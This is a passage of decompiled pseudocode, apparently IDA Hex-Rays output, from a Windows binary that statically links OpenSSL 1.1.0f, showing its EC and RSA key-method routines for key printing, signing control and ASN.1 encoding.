  __int64 *v17[2]; // [rsp+38h] [rbp-10h] BYREF
  unsigned int v18; // [rsp+58h] [rbp+10h] BYREF

  switch ( a2 )
  {
    case 1:
      if ( a3 )
        goto LABEL_20;
      sub_14007F340(a4, 0i64, &v16, v17);
      if ( !v16 )
        goto LABEL_8;
      if ( !*v16 )
        goto LABEL_8;
      v6 = sub_14002C260(*v16);
      if ( !v6 )
        goto LABEL_8;
      v7 = sub_14001D4F0(a1);
      if ( !(unsigned int)sub_140035E60(&v18, v6, v7) )
        goto LABEL_8;
      v8 = sub_14002C0F0(v18);
      sub_140067440(v17[0], (__int64)v8, -1, 0i64);
      result = 1i64;
      break;
    case 3:
      *(_DWORD *)a4 = 672;
      result = 2i64;
      break;
    case 5:
      if ( a3 )
        goto LABEL_20;
      sub_14007F560(a4, 0i64, 0i64, v17, &v16);
      if ( v17[0]
        && *v17[0]
        && (v10 = sub_14002C260(*v17[0])) != 0
        && (v11 = sub_14001D4F0(a1), (unsigned int)sub_140035E60(&v18, v10, v11)) )
      {
        v12 = sub_14002C0F0(v18);
        sub_140067440(v16, (__int64)v12, -1, 0i64);
        result = 1i64;
      }
      else
      {
LABEL_8:
        result = 0xFFFFFFFFi64;
      }
      break;
    case 7:
      if ( a3 == 1 )
      {
        result = sub_14004B130((__int64)a4);
      }
      else
      {
        if ( a3 )
          goto LABEL_24;
        result = sub_14004B220((__int64)a4);
      }
      break;
    case 8:
      *(_DWORD *)a4 = 1;
LABEL_20:
      result = 1i64;
      break;
    case 9:
      v13 = a3;
      v14 = sub_14001D460((__int64)a1);
      result = sub_14001C880(v14, a4, v13, 0i64);
      break;
    case 10:
      v15 = sub_14001D460((__int64)a1);
      result = sub_14001C7A0(v15, 4, a4, 0i64);
      break;
    default:
LABEL_24:
      result = 4294967294i64;
      break;
  }
  return result;
}

//----- (000000014004AEE0) ----------------------------------------------------
__int64 __fastcall sub_14004AEE0(__int64 a1, std::ios_base *a2, unsigned int a3, int a4)
{
  __int64 v4; // rbx
  __int64 v9; // r15
  unsigned int v10; // r13d
  __FrameHandler3::TryBlockMap *v11; // r12
  int v12; // eax
  const char *v13; // rdi
  unsigned int v14; // eax
  void *v16; // [rsp+30h] [rbp-38h] BYREF
  void *v17; // [rsp+78h] [rbp+10h] BYREF

  v4 = 0i64;
  v17 = 0i64;
  v16 = 0i64;
  v9 = 0i64;
  v10 = 0;
  if ( a2 )
  {
    v11 = (__FrameHandler3::TryBlockMap *)sub_14001C740((__int64)a2);
    if ( v11 )
    {
      if ( a4 != 2 )
      {
        if ( std::ios_base::precision(a2) )
        {
          v12 = sub_14001C770((__int64)a2);
          v9 = sub_14001C7A0((__int64)a2, v12, &v16, 0i64);
          if ( !v9 )
            goto LABEL_22;
        }
      }
      if ( a4 )
      {
        v13 = "Public-Key";
        if ( a4 != 1 )
          v13 = "ECDSA-Parameters";
      }
      else
      {
        if ( std::ios_base::width(a2) )
        {
          v4 = sub_14001C980((__int64)a2, &v17);
          if ( !v4 )
            goto LABEL_22;
        }
        v13 = "Private-Key";
      }
      if ( (unsigned int)sub_140029E80(a1, a3, 128) )
      {
        v14 = sub_140021D20((__int64)v11);
        if ( (int)sub_14002A590(a1, "%s: (%d bit)\n", v13, v14) > 0
          && (!v4
           || (int)sub_14002A590(a1, "%*spriv:\n", a3, byte_1400D7DAE) > 0
           && (unsigned int)sub_1400672A0(a1, (__int64)v17, v4, a3 + 4))
          && (!v9
           || (int)sub_14002A590(a1, "%*spub:\n", a3, byte_1400D7DAE) > 0
           && (unsigned int)sub_1400672A0(a1, (__int64)v16, v9, a3 + 4))
          && (unsigned int)sub_14007FF00(a1, v11, a3) )
        {
          v10 = 1;
LABEL_23:
          sub_14001DA40(v17, v4, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 0x18Bu);
          sub_14001D930(v16);
          return v10;
        }
      }
LABEL_22:
      sub_140024610(16, 221, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 394);
      goto LABEL_23;
    }
  }
  sub_140024610(16, 221, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 346);
  return 0i64;
}

//----- (000000014004B130) ----------------------------------------------------
__int64 __fastcall sub_14004B130(__int64 a1)
{
  __int64 v2; // rax
  __int64 *v3; // rbx
  _QWORD *v5; // [rsp+48h] [rbp+10h] BYREF
  unsigned int *v6; // [rsp+50h] [rbp+18h] BYREF

  v2 = sub_14007E6B0(a1);
  v3 = (__int64 *)v2;
  if ( !v2 )
    return 0i64;
  if ( !sub_14001C740(v2) )
  {
    if ( !(unsigned int)sub_14007EEA0(a1, &v5, &v6, 0i64, 0i64, 0i64) || !v5 || !v6 )
      return 0i64;
    if ( !(unsigned int)sub_14004B740((__int64)v3, v5, v6) )
    {
      sub_140024610(16, 238, 149, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 728);
      return 0i64;
    }
  }
  if ( (unsigned int)sub_14004B890(v3, a1) )
    return 1i64;
  sub_140024610(16, 238, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 734);
  return 0i64;
}

//----- (000000014004B220) ----------------------------------------------------
__int64 __fastcall sub_14004B220(__int64 a1)
{
  unsigned int v1; // ebx
  __int64 v3; // rdi
  __int64 result; // rax
  __int64 *v5; // r14
  __int64 jumpbuf_sp; // rsi
  __int64 v7; // rsi
  int v8; // eax
  unsigned __int8 *v9; // rax
  int v10; // eax
  char **v11; // rax
  int v12; // r12d
  int v13; // eax
  int v14; // esi
  int v15; // eax
  _BYTE *v16; // rsi
  unsigned int *v17; // rax
  unsigned int v18; // r12d
  unsigned int v19; // r15d
  __int64 v20; // rax
  unsigned int v21; // ecx
  int v22; // r14d
  _DWORD *v23; // rax
  __int64 v24; // rsi
  char **v25; // rax
  __int64 v26; // [rsp+30h] [rbp-40h] BYREF
  unsigned int *v27; // [rsp+38h] [rbp-38h] BYREF
  char **v28; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int8 *v29; // [rsp+48h] [rbp-28h] BYREF
  __int64 v30; // [rsp+50h] [rbp-20h] BYREF
  unsigned int v31; // [rsp+A8h] [rbp+38h] BYREF
  unsigned __int8 *v32; // [rsp+B0h] [rbp+40h] BYREF
  __int64 *v33; // [rsp+B8h] [rbp+48h] BYREF

  v1 = 0;
  v3 = 0i64;
  v32 = 0i64;
  result = sub_14007E6B0(a1);
  v5 = (__int64 *)result;
  if ( result )
  {
    jumpbuf_sp = _except_get_jumpbuf_sp(result);
    if ( (unsigned int)sub_14007EEA0(a1, &v33, &v26, 0i64, 0i64, 0i64) )
    {
      sub_1400673E0(&v28, 0i64, 0i64, v33);
      if ( v28 != sub_14002C0F0(0) )
        goto LABEL_8;
      v7 = *(_QWORD *)(jumpbuf_sp + 32);
      v8 = sub_140066EA0(v7, 0i64);
      if ( v8 > 0 )
      {
        v9 = (unsigned __int8 *)sub_14001D8E0(v8);
        v32 = v9;
        if ( !v9 )
        {
LABEL_34:
          sub_14001D930(v9);
          sub_1400673C0((unsigned int *)v3);
          return v1;
        }
        v29 = v9;
        v10 = sub_140066EA0(v7, (void **)&v29);
        if ( v10 > 0 )
        {
          sub_1400476D0(v26, (__int64)v32, v10);
          *(_DWORD *)(v26 + 16) &= 0xFFFFFFF0;
          *(_DWORD *)(v26 + 16) |= 8u;
          v32 = 0i64;
          v11 = sub_14002C0F0(0x198u);
          sub_140067440(v33, (__int64)v11, -1, 0i64);
LABEL_8:
          v12 = sub_140020440(v5, 408, 1024, 0x1004u, 0xFFFFFFFE, 0i64);
          if ( v12 > 0 )
          {
            if ( (unsigned int)sub_140020440(v5, 408, 1024, 0x1006u, 0, (__int64)&v27) )
            {
              v13 = sub_140020440(v5, 408, 1024, 0x1003u, 0xFFFFFFFE, 0i64);
              v14 = v13;
              if ( v13 >= 0 )
              {
                if ( v13 )
                {
                  if ( v13 == 1 )
                    v14 = 947;
                }
                else
                {
                  v14 = 946;
                }
                if ( v12 == 1 && (int)sub_140020440(v5, 408, 1024, 0x1004u, 2u, 0i64) > 0 )
                {
                  if ( v27
                    || (v27 = (unsigned int *)sub_14005BAC0(),
                        (int)sub_140020440(v5, 408, 1024, 0x1005u, 0, (__int64)v27) > 0) )
                  {
                    if ( (unsigned int)sub_14007EE10(a1, &v33, &v30) )
                    {
                      v15 = sub_14001D4F0(v27);
                      if ( (unsigned int)sub_140035E60(&v31, v15, v14) )
                      {
                        v16 = (_BYTE *)sub_14007EE80(a1);
                        v17 = (unsigned int *)sub_140021BD0((__int64)v16);
                        v18 = sub_140024FD0(v17);
                        v19 = sub_140024D30((__int64)v16);
                        v3 = sub_140067420();
                        if ( v3 )
                        {
                          *(_QWORD *)v3 = sub_14002C0F0(v18);
                          v20 = sub_14004FF40();
                          *(_QWORD *)(v3 + 8) = v20;
                          if ( v20 )
                          {
                            if ( (int)sub_140024EC0(v16, v20) > 0 )
                            {
                              if ( !(unsigned int)sub_14003F270(*(_QWORD **)(v3 + 8)) )
                              {
                                sub_14004FF20(*(unsigned int **)(v3 + 8));
                                *(_QWORD *)(v3 + 8) = 0i64;
                              }
                              if ( (int)sub_140020440(v5, 408, 1024, 0x1007u, v19, 0i64) > 0 )
                              {
                                v21 = sub_1400809F0(&v32, v3, v30, v19);
                                if ( v21 )
                                {
                                  if ( (int)sub_140020440(v5, 408, 1024, 0x1009u, v21, (__int64)v32) > 0 )
                                  {
                                    v32 = 0i64;
                                    v22 = sub_140067560((unsigned int *)v3, &v32);
                                    v9 = v32;
                                    if ( !v32 || !v22 )
                                      goto LABEL_34;
                                    v23 = sub_140047570();
                                    v24 = (__int64)v23;
                                    if ( v23 )
                                    {
                                      sub_1400476D0((__int64)v23, (__int64)v32, v22);
                                      v32 = 0i64;
                                      v25 = sub_14002C0F0(v31);
                                      sub_140067440(v33, (__int64)v25, 16, v24);
                                      v1 = 1;
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    v9 = v32;
    goto LABEL_34;
  }
  return result;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (000000014004B630) ----------------------------------------------------
__int64 __fastcall sub_14004B630(__int64 *a1, int a2)
{
  unsigned int v4; // ebx
  unsigned int v5; // eax
  char *v6; // rax
  __int64 v7; // rax
  int v8; // [rsp+48h] [rbp+10h] BYREF
  unsigned int v9; // [rsp+50h] [rbp+18h] BYREF

  if ( !a2 || !(unsigned int)sub_140035DA0(a2, &v9, &v8) )
    return 0i64;
  v4 = 0;
  if ( v8 == 946 )
  {
    v5 = 0;
  }
  else
  {
    if ( v8 != 947 )
      return 0i64;
    v5 = 1;
  }
  if ( (int)sub_140020440(a1, 408, 1024, 0x1003u, v5, 0i64) > 0
    && (int)sub_140020440(a1, 408, 1024, 0x1004u, 2u, 0i64) > 0 )
  {
    v6 = sub_14002C1A0(v9);
    v7 = sub_14001E990((__int64)v6);
    if ( v7 )
    {
      LOBYTE(v4) = (int)sub_140020440(a1, 408, 1024, 0x1005u, 0, v7) > 0;
      return v4;
    }
  }
  return 0i64;
}

//----- (000000014004B740) ----------------------------------------------------
__int64 __fastcall sub_14004B740(__int64 a1, _QWORD *a2, unsigned int *a3)
{
  unsigned int v5; // edi
  _DWORD *v6; // rbx
  __int64 **v7; // rax
  __int64 jumpbuf_sp; // rax
  __int64 *v9; // rsi
  int v10; // esi
  _DWORD *v11; // rax
  __int64 **v13; // [rsp+20h] [rbp-38h] BYREF
  __int64 v14; // [rsp+28h] [rbp-30h] BYREF
  __int64 v15; // [rsp+30h] [rbp-28h] BYREF
  struct _xDISPATCHER_CONTEXT *v16; // [rsp+38h] [rbp-20h] BYREF
  int v17; // [rsp+78h] [rbp+20h] BYREF

  v5 = 0;
  v13 = 0i64;
  v6 = 0i64;
  sub_1400673E0(&v14, &v17, &v15, a2);
  if ( (unsigned int)sub_14002C260(v14) != 408 )
    goto LABEL_15;
  if ( v17 != -1 && v17 != 5 )
  {
    v7 = sub_14004BB90(v17, v15);
    v13 = v7;
    if ( !v7 )
      goto LABEL_16;
    goto LABEL_9;
  }
  jumpbuf_sp = _except_get_jumpbuf_sp(a1);
  if ( !jumpbuf_sp )
  {
LABEL_15:
    v7 = v13;
    goto LABEL_16;
  }
  v9 = (__int64 *)sub_14001C740(*(_QWORD *)(jumpbuf_sp + 32));
  v7 = (__int64 **)sub_14001C7F0();
  v13 = v7;
  if ( v7 )
  {
    if ( (unsigned int)sub_14001CAF0(v7, v9) )
    {
LABEL_9:
      v10 = sub_14001D4F0(a3);
      v16 = __FrameHandler3::TryBlockMap::getpDC((__FrameHandler3::TryBlockMap *)a3);
      if ( v16 )
      {
        if ( v10 )
        {
          if ( sub_140067000((__int64 *)&v13, (_BYTE **)&v16, v10) )
          {
            v11 = sub_14001D530();
            v6 = v11;
            if ( v11 )
            {
              sub_14001D670((__int64)v11, (__int64)v13);
              if ( (int)sub_140020C80(a1, v6) > 0 )
                v5 = 1;
            }
          }
        }
      }
      goto LABEL_15;
    }
    goto LABEL_15;
  }
LABEL_16:
  sub_14001C600((__int64)v7);
  sub_14001D3C0((__int64)v6);
  return v5;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (000000014004B890) ----------------------------------------------------
__int64 __fastcall sub_14004B890(__int64 *a1, __int64 a2)
{
  unsigned int v4; // ebx
  int v5; // eax
  __int64 v7; // rax
  __int64 *v8; // rsi
  _DWORD *v9; // rdi
  unsigned int v10; // eax
  char *v11; // rax
  __int64 v12; // rax
  int *v13; // rbp
  unsigned int v14; // edi
  unsigned int v15; // eax
  char *v16; // [rsp+30h] [rbp-28h] BYREF
  __int64 v17[4]; // [rsp+38h] [rbp-20h] BYREF
  unsigned __int8 *v18; // [rsp+70h] [rbp+18h] BYREF
  __int64 *v19; // [rsp+78h] [rbp+20h] BYREF

  v4 = 0;
  v18 = 0i64;
  if ( !(unsigned int)sub_14007EE10(a2, &v19, v17) )
    return 0i64;
  v5 = sub_14002C260(*v19);
  if ( !(unsigned int)sub_14004B630(a1, v5) )
  {
    sub_140024610(16, 239, 148, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 669);
    return 0i64;
  }
  v7 = v19[1];
  if ( *(_DWORD *)v7 != 16 )
    return 0i64;
  v16 = *(char **)(*(_QWORD *)(v7 + 8) + 8i64);
  v8 = (__int64 *)sub_140067540(0i64, &v16, **(unsigned int **)(v19[1] + 8));
  if ( v8 )
  {
    v9 = (_DWORD *)sub_14007EE80(a2);
    if ( v9 )
    {
      v10 = sub_14002C260(*v8);
      v11 = sub_14002C1A0(v10);
      v12 = sub_14001E950((__int64)v11);
      v13 = (int *)v12;
      if ( v12 )
      {
        if ( (sub_140024CF0(v12) & 0xF0007) == 65538 )
        {
          if ( (unsigned int)sub_14001C050(v9, v13, 0i64, 0i64, 0i64) )
          {
            if ( (int)sub_140024D90((__int64)v9, v8[1]) > 0 )
            {
              v14 = sub_140024D30((__int64)v9);
              if ( (int)sub_140020440(a1, 408, 1024, 0x1007u, v14, 0i64) > 0 )
              {
                v15 = sub_1400809F0(&v18, (__int64)v8, v17[0], v14);
                if ( v15 )
                {
                  if ( (int)sub_140020440(a1, 408, 1024, 0x1009u, v15, (__int64)v18) > 0 )
                  {
                    v18 = 0i64;
                    v4 = 1;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  sub_1400673C0((unsigned int *)v8);
  sub_14001D930(v18);
  return v4;
}
// 14004B890: using guessed type __int64 var_20[4];

//----- (000000014004BA90) ----------------------------------------------------
__int64 __fastcall sub_14004BA90(_DWORD *a1, char ***a2, __int64 a3)
{
  __int64 v6; // rax
  __int64 v7; // rbx
  unsigned int v8; // eax
  __int64 result; // rax
  _DWORD *v10; // rax
  int *v11; // rbx
  int v12; // eax

  if ( a3 && (v6 = sub_14001C740(a3), (v7 = v6) != 0) )
  {
    if ( (unsigned int)sub_140021A00(v6) )
    {
      v8 = sub_140021B00(v7);
      if ( v8 )
      {
        *a2 = sub_14002C0F0(v8);
        result = 1i64;
        *a1 = 6;
        return result;
      }
    }
    v10 = sub_140047570();
    v11 = v10;
    if ( v10 )
    {
      v12 = sub_140066C20(a3, (unsigned __int8 **)v10 + 1);
      *v11 = v12;
      if ( v12 > 0 )
      {
        *a2 = (char **)v11;
        result = 1i64;
        *a1 = 16;
        return result;
      }
      sub_140047500((__int64)v11);
      sub_140024610(16, 223, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 49);
    }
  }
  else
  {
    sub_140024610(16, 223, 124, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 31);
  }
  return 0i64;
}

//----- (000000014004BB90) ----------------------------------------------------
__int64 **__fastcall sub_14004BB90(int a1, __int64 a2)
{
  __int64 **v2; // rbx
  unsigned int v4; // r8d
  int v5; // eax
  __int64 v6; // rax
  __int64 *v7; // rdi
  int v9; // [rsp+20h] [rbp-18h]
  char *v10; // [rsp+50h] [rbp+18h] BYREF

  v2 = 0i64;
  if ( a1 == 16 )
  {
    v4 = *(_DWORD *)a2;
    v10 = *(char **)(a2 + 8);
    v2 = (__int64 **)sub_1400661B0(0i64, &v10, v4);
    if ( !v2 )
    {
      v9 = 102;
LABEL_12:
      sub_140024610(16, 220, 142, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", v9);
      goto LABEL_13;
    }
    return v2;
  }
  if ( a1 != 6 )
  {
    v9 = 124;
    goto LABEL_12;
  }
  v2 = (__int64 **)sub_14001C7F0();
  if ( v2 )
  {
    v5 = sub_14002C260(a2);
    v6 = sub_140028760(v5);
    v7 = (__int64 *)v6;
    if ( !v6 )
      goto LABEL_13;
    sub_140021D70(v6, 1);
    if ( !(unsigned int)sub_14001CAF0(v2, v7) )
      goto LABEL_13;
    sub_140021910(v7);
    return v2;
  }
  sub_140024610(16, 220, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_ameth.c", 113);
LABEL_13:
  sub_14001C600((__int64)v2);
  return 0i64;
}

//----- (000000014004BC80) ----------------------------------------------------
__int64 sub_14004BC80()
{
  return 64i64;
}

//----- (000000014004BC90) ----------------------------------------------------
void __fastcall sub_14004BC90(std::ios_base *a1)
{
  int *v1; // rax
  __int64 v2; // rbx
  __int64 v3; // rcx

  v1 = (int *)std::ios_base::precision(a1);
  v2 = (__int64)v1;
  if ( v1 )
  {
    v3 = *((_QWORD *)v1 + 1);
    if ( v3 )
      sub_140023440(v3, *v1);
    sub_14004FD70(v2);
  }
}

//----- (000000014004BCD0) ----------------------------------------------------
__int64 __fastcall sub_14004BCD0(__int64 a1, int a2, __int64 a3, _DWORD *a4)
{
  if ( a2 != 3 )
    return 4294967294i64;
  *a4 = 672;
  return 1i64;
}

//----- (000000014004BCF0) ----------------------------------------------------
int __fastcall sub_14004BCF0(std::ios_base *a1, std::ios_base *a2)
{
  __int64 v3; // rbx
  const void **v4; // rax

  v3 = std::ios_base::precision(a2);
  v4 = (const void **)std::ios_base::precision(a1);
  return sub_14006B060(v4, v3);
}

//----- (000000014004BD30) ----------------------------------------------------
__int64 __fastcall sub_14004BD30(__int64 a1, _BYTE **a2, int a3)
{
  _DWORD *v6; // rax
  __int64 v7; // rbx

  v6 = sub_14004FEE0();
  v7 = (__int64)v6;
  if ( v6 && (unsigned int)sub_14006B0A0((__int64)v6, *a2, a3) && sub_14001D1A0(a1, 855, v7) )
    return 1i64;
  sub_14004FD70(v7);
  return 0i64;
}

//----- (000000014004BDC0) ----------------------------------------------------
__int64 __fastcall sub_14004BDC0(std::ios_base *a1, void **a2)
{
  const void **v3; // rax
  const void **v4; // rdi
  void *v5; // rax
  int v7; // esi

  v3 = (const void **)std::ios_base::precision(a1);
  v4 = v3;
  if ( a2 )
  {
    if ( *a2 )
    {
      v7 = 1;
    }
    else
    {
      v5 = sub_14001D8E0(*(int *)v3);
      *a2 = v5;
      if ( !v5 )
        return 0xFFFFFFFFi64;
      v7 = 0;
    }
    memmove(*a2, v4[1], *(int *)v4);
    if ( v7 )
      *a2 = (char *)*a2 + *(int *)v4;
  }
  return *(unsigned int *)v4;
}

//----- (000000014004BE60) ----------------------------------------------------
__int64 __fastcall sub_14004BE60(__int64 a1, __int64 a2)
{
  int v3; // ebx
  char **v4; // rax
  unsigned __int8 *v6; // [rsp+48h] [rbp+10h] BYREF

  v6 = 0i64;
  v3 = sub_140080D20(*(unsigned int **)(a2 + 32), &v6);
  if ( v3 > 0 )
  {
    v4 = sub_14002C0F0(6u);
    if ( (unsigned int)sub_140067870(a1, (__int64)v4, 5, 0i64, (__int64)v6, v3) )
      return 1i64;
    sub_14001D930(v6);
  }
  return 0i64;
}

//----- (000000014004BF00) ----------------------------------------------------
__int64 __fastcall sub_14004BF00(__int64 a1, __int64 a2)
{
  __int64 v3; // rax
  unsigned int v5; // [rsp+50h] [rbp+18h] BYREF
  char *v6; // [rsp+58h] [rbp+20h] BYREF

  if ( !(unsigned int)sub_140067820(0i64, &v6, &v5, 0i64, a2) )
    return 0i64;
  v3 = sub_140080CE0(0i64, &v6, v5);
  if ( !v3 )
  {
    sub_140024610(4, 139, 4, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 51);
    return 0i64;
  }
  sub_14001D1A0(a1, 6, v3);
  return 1i64;
}

//----- (000000014004BF90) ----------------------------------------------------
_BOOL8 __fastcall sub_14004BF90(__int64 a1, __int64 a2)
{
  return !(unsigned int)sub_140026AB0(
                          *(_QWORD *)(*(_QWORD *)(a2 + 32) + 24i64),
                          *(__int64 **)(*(_QWORD *)(a1 + 32) + 24i64))
      && !(unsigned int)sub_140026AB0(
                          *(_QWORD *)(*(_QWORD *)(a2 + 32) + 32i64),
                          *(__int64 **)(*(_QWORD *)(a1 + 32) + 32i64));
}

//----- (000000014004C000) ----------------------------------------------------
__int64 __fastcall sub_14004C000(__int64 a1, char **a2, __int64 a3)
{
  __int64 v4; // rax

  v4 = sub_140080CC0(0i64, a2, a3);
  if ( v4 )
  {
    sub_14001D1A0(a1, 6, v4);
    return 1i64;
  }
  else
  {
    sub_140024610(4, 147, 4, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 72);
    return 0i64;
  }
}

//----- (000000014004C070) ----------------------------------------------------
__int64 __fastcall sub_14004C070(__int64 a1, unsigned __int8 **a2)
{
  return sub_140080D00(*(unsigned int **)(a1 + 32), a2);
}

//----- (000000014004C090) ----------------------------------------------------
__int64 __fastcall sub_14004C090(__int64 a1, __int64 a2)
{
  int v3; // ebx
  char **v5; // rax
  unsigned __int8 *v6; // [rsp+58h] [rbp+10h] BYREF

  v6 = 0i64;
  v3 = sub_140080D00(*(unsigned int **)(a2 + 32), &v6);
  if ( v3 <= 0 )
  {
    sub_140024610(4, 138, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 91);
    return 0i64;
  }
  v5 = sub_14002C0F0(6u);
  if ( !(unsigned int)sub_140067670(a1, (__int64)v5, 0, 5, 0i64, (__int64)v6, v3) )
  {
    sub_140024610(4, 138, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 97);
    return 0i64;
  }
  return 1i64;
}

//----- (000000014004C150) ----------------------------------------------------
__int64 __fastcall sub_14004C150(__int64 a1, __int64 a2)
{
  __int64 v3; // rax
  unsigned int v5; // [rsp+50h] [rbp+18h] BYREF
  char *v6; // [rsp+58h] [rbp+20h] BYREF

  if ( !(unsigned int)sub_1400675F0(0i64, &v6, &v5, 0i64, a2) )
    return 0i64;
  v3 = sub_140080CC0(0i64, &v6, v5);
  if ( !v3 )
  {
    sub_140024610(4, 147, 4, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 72);
    return 0i64;
  }
  sub_14001D1A0(a1, 6, v3);
  return 1i64;
}

//----- (000000014004C1E0) ----------------------------------------------------
__int64 __fastcall sub_14004C1E0(__int64 a1)
{
  return sub_14005E580(*(_QWORD *)(a1 + 32));
}

//----- (000000014004C200) ----------------------------------------------------
__int64 __fastcall sub_14004C200(__int64 a1)
{
  return sub_140027260(*(_QWORD *)(*(_QWORD *)(a1 + 32) + 24i64));
}

//----- (000000014004C220) ----------------------------------------------------
__int64 __fastcall sub_14004C220(__int64 a1)
{
  return sub_14002D220(*(_QWORD *)(a1 + 32));
}

//----- (000000014004C240) ----------------------------------------------------
void __fastcall sub_14004C240(__int64 a1)
{
  sub_14002CEF0(*(_QWORD *)(a1 + 32));
}

//----- (000000014004C260) ----------------------------------------------------
__int64 __fastcall sub_14004C260(__int64 a1, __int64 a2, int a3)
{
  __int64 v3; // r14
  unsigned int v4; // ebx
  unsigned int v7; // ebp
  __int64 v8; // rcx

  v3 = *(_QWORD *)(a2 + 32);
  v4 = 0;
  v7 = 0;
  v8 = *(_QWORD *)(v3 + 24);
  if ( v8 )
    v7 = sub_140027260(v8);
  if ( (unsigned int)sub_140029E80(a1, a3, 128)
    && (int)sub_14002A590(a1, "Public-Key: (%d bit)\n", v7) > 0
    && (unsigned int)sub_1400670C0(a1, "Modulus:", *(_QWORD *)(v3 + 24), 0i64, a3)
    && (unsigned int)sub_1400670C0(a1, "Exponent:", *(_QWORD *)(v3 + 32), 0i64, a3) )
  {
    return 1;
  }
  return v4;
}

//----- (000000014004C330) ----------------------------------------------------
__int64 __fastcall sub_14004C330(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax

  return sub_14004C740(a1, *(__int64 **)(a2 + 32), a3, v3 - 39);
}
// 14004C341: variable 'v3' is possibly undefined

//----- (000000014004C350) ----------------------------------------------------
__int64 __fastcall sub_14004C350(__int64 a1, __int64 *a2, int *a3, int a4)
{
  __int64 *v8; // rdi
  void *v9; // rax
  __int64 v10; // rax
  unsigned int *v11; // rsi
  __int64 *v12; // rbx
  void *v13; // rax
  int v14; // ebx

  if ( (unsigned int)sub_14002C260(*a2) == 912 )
  {
    v8 = 0i64;
    v9 = sub_140080C90();
    v10 = sub_14003F490((__int64)v9, a2[1]);
    v11 = (unsigned int *)v10;
    if ( v10 )
    {
      v12 = *(__int64 **)(v10 + 8);
      if ( v12 )
      {
        if ( (unsigned int)sub_14002C260(*v12) == 911 )
        {
          v13 = sub_1400673B0();
          v8 = (__int64 *)sub_14003F490((__int64)v13, v12[1]);
        }
      }
    }
    else
    {
      v11 = 0i64;
    }
    v14 = sub_14004D400(a1, (__int64)v11, v8, a4);
    sub_140080C70(v11);
    sub_1400673C0((unsigned int *)v8);
    if ( !v14 )
      return 0i64;
    if ( a3 )
      return sub_140060520(a1, a3, a4);
  }
  else
  {
    if ( a3 )
      return sub_140060520(a1, a3, a4);
    if ( (int)sub_14002A1A0(a1, (__int64)"\n") <= 0 )
      return 0i64;
  }
  return 1i64;
}

//----- (000000014004C470) ----------------------------------------------------
__int64 __fastcall sub_14004C470(__int64 a1, int a2, int a3, _QWORD *a4)
{
  char **v4; // rax
  __int64 result; // rax
  __int64 *v6[3]; // [rsp+20h] [rbp-18h] BYREF

  v6[0] = 0i64;
  switch ( a2 )
  {
    case 1:
      if ( a3 )
        goto LABEL_17;
      sub_14007F340(a4, 0i64, 0i64, v6);
      goto LABEL_6;
    case 2:
      if ( a3 )
        goto LABEL_17;
      sub_14007F330((__int64)a4, v6);
LABEL_6:
      if ( !v6[0] )
        goto LABEL_17;
      v4 = sub_14002C0F0(6u);
      sub_140067440(v6[0], (__int64)v4, 5, 0i64);
      return 1i64;
    case 3:
      *(_DWORD *)a4 = 672;
      return 1i64;
    case 5:
      if ( !a3 )
        return sub_14004CED0(a4);
      if ( a3 != 1 )
        goto LABEL_17;
      result = sub_14004CFB0(a4);
      break;
    case 7:
      if ( a3 )
      {
        if ( a3 == 1 )
          result = sub_14004C990((__int64)a4);
        else
LABEL_17:
          result = 1i64;
      }
      else
      {
        result = sub_14004CC60((__int64)a4);
      }
      break;
    case 8:
      *(_DWORD *)a4 = 0;
      goto LABEL_17;
    default:
      return 4294967294i64;
  }
  return result;
}

//----- (000000014004C5A0) ----------------------------------------------------
__int64 __fastcall sub_14004C5A0(__int64 a1, __int64 a2, __int64 a3, __int64 *a4, int a5, __int64 a6)
{
  int v9; // eax
  unsigned int v10; // ecx

  if ( (unsigned int)sub_14002C260(*a4) == 912 )
  {
    v9 = sub_14004D650(a1, 0i64, a4, a6);
    v10 = -1;
    if ( v9 > 0 )
      return 2;
    return v10;
  }
  else
  {
    sub_140024610(4, 148, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_ameth.c", 607);
    return 0xFFFFFFFFi64;
  }
}

//----- (000000014004C630) ----------------------------------------------------
__int64 __fastcall sub_14004C630(std::ios_base *a1, __int64 a2, __int64 a3, __int64 *a4, __int64 *a5)
{
  __int64 *v6; // rbx
  _DWORD *v8; // rax
  __int64 v9; // rbx
  __int64 v10; // rsi
  char **v11; // rax
  char **v12; // rax
  int v13[6]; // [rsp+30h] [rbp-18h] BYREF

  v6 = (__int64 *)std::ios_base::precision(a1);
  if ( (int)sub_140020440(v6, 6, -1, 0x1006u, 0, (__int64)v13) <= 0 )
    return 0i64;
  if ( v13[0] != 6 )
    return 2i64;
  v8 = sub_14004D060(v6);
  v9 = (__int64)v8;
  if ( !v8 )
    return 0i64;
  if ( a5 )
  {
    v10 = sub_140047450((__int64)v8);
    if ( !v10 )
    {
      sub_140047500(v9);
      return 0i64;
    }
    v11 = sub_14002C0F0(0x390u);
